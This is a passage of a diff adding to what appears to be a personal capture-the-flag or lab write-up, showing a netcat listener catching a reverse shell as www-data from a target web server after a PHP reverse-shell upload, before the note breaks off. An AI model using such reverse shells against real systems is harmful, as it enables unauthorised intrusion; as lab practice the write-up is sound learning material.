@@ -188,3 +188,17 @@ CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  php-reverse-shell.php
 └─$ 
 [0] 0:zsh*Z                                              
 ```
+```
+root@ip-10-64-92-225:~# nc -lvp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.64.146.97 59812
+Linux ip-10-64-146-97 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 11:48:45 up 16 min,  0 users,  load average: 0.00, 0.01, 0.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python 
+```
+
+> [!note]
+> After annoying technical difficulties with setting up reverse shell, i went o
